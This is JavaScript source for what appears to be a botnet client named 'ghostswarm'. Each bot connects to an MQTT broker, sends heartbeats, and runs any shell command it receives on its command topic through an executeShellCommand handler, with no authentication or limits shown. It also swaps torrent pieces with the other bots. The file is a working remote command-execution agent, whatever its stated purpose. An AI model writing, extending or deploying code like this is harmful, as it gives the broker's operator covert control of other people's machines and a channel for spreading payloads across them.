const { exec } = require('child_process');

const MQTT_BROKER = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';

const fs = require("fs");
const path = require("path");
const { download } = require("./torrent/download"); // Ensure you have this package installed
const config = require("./config");
const { startMQTT } = require("./mqtt/client");
const { startHeartbeat } = require("./heartbeat/heartbeat");
const { executeShellCommand } = require("./commands/commands");

const botId = config.mqtt.botId;

console.log(`🤖 [${botId}] connecting to MQTT broker at ${MQTT_BROKER}`);
const mqttClient = startMQTT()
startHeartbeat(mqttClient);
checkForTorrents();

mqttClient.on('message', (topic, message) => {
   console.log("message received on topic:", topic);

   try {
      if (topic == `ghostswarm/${botId}/command`) {
         const payload = JSON.parse(message.toString());
         console.log(`📥 [${botId}] received:`, payload);
         executeShellCommand(payload, mqttClient);

      } else if (topic.startsWith('ghostswarm/download/')) {
         const infoHash = topic.split('/')[2];
         const payload = JSON.parse(message.toString());
         console.log(`📥 [${botId}] received torrent download request for ${infoHash}`, payload);
         handleTorrentDownload(infoHash, payload);
      }

      else if (topic.startsWith('ghostswarm/torrent/have/')) {
         const bot = topic.split('/')[3];
         const { infoHash, pieceIndex } = JSON.parse(message.toString());
         if (bot == botId) {
            return;
         }
         updateSwarmMap(infoHash, pieceIndex, bot);
      }

      else if (topic.startsWith(`ghostswarm/${botId}/download/`)) {
         const infoHash = topic.split('/')[3];
         const payload = JSON.parse(message.toString());
         console.log(`📥 [${botId}] need to download torrent ${infoHash}`, payload);
         handleTorrentDownload(infoHash, payload);
      }
   } catch (err) {
      console.error(`❌ [${botId}] failed to handle message`, err);

      // Send error response
      const statusTopic = `ghostswarm/${botId}/status`;
      mqttClient.publish(statusTopic, JSON.stringify({
         status: "error",
         error: err.message,
         time: Date.now()
      }));
   }
});

function updateSwarmMap(infoHash, pieceIndex, who) {
   const swarmFile = config.PATHS.SWARM_DIR + `/${infoHash}.json`;
   fs.mkdirSync(path.dirname(swarmFile), { recursive: true });

   let map = {};
   if (fs.existsSync(swarmFile)) {
      map = JSON.parse(fs.readFileSync(swarmFile));
   }

   const key = pieceIndex.toString();
   if (!map[key]) map[key] = [];
   if (!map[key].includes(who)) map[key].push(who);

   fs.writeFileSync(swarmFile, JSON.stringify(map, null, 2));
   console.log(`🧠 Swarm updated: piece ${pieceIndex} held by ${who}`);
}

function handleTorrentDownload(infoHash, payload) {
   // save payload to file 
   const torrentPath = config.PATHS.TORRENTS_DIR + `/${infoHash}${config.PATHS.TORRENT_EXTENSION}`;
   const outDir = config.PATHS.PIECES_DIR + `/${infoHash}`;
   const uploadsDir = config.PATHS.UPLOADS_DIR + `/${payload.name}`;
   if (fs.existsSync(outDir)) {
      console.log(`📂 [${botId}] torrent ${infoHash} already exists in ${outDir}`);
      return;
   }
   if (fs.existsSync(torrentPath)) {
      console.log(`📂 [${botId}] torrent ${infoHash} already exists in ${torrentPath}`);
      return;
   }
   if (fs.existsSync(uploadsDir)) {
      console.log(`📂 [${botId}] torrent ${infoHash} already exists in ${uploadsDir}`);
      return;
   }

   fs.mkdirSync('torrents', { recursive: true }); // ensure directory exists
   fs.writeFileSync(torrentPath, JSON.stringify(payload, null, 2));
   console.log(`📂 [${botId}] saved torrent to ${torrentPath}`);

   // check if torrent already exists and is downloaded
   // Download the torrent


   download(payload, infoHash, mqttClient)
      .then(() => {
         console.log(`📥 [${botId}] started downloading torrent ${infoHash}`);
      })
      .catch(err => {
         console.error(`❌ [${botId}] failed to download torrent ${infoHash}:`, err);
         // Send error response
         const statusTopic = `ghostswarm/${botId}/status`;
         mqttClient.publish(statusTopic, JSON.stringify({
            status: "error",
            error: err.message,
            time: Date.now()
         }));
      }
      );

}


function checkForTorrents() {
   mqttClient.publish(`ghostswarm/${botId}/check/torrents`, JSON.stringify({
      requestId: `req-${Date.now()}`,
      type: "checkTorrents"
   }));
   console.log(`📥 [${botId}] sent torrent check request`);
}





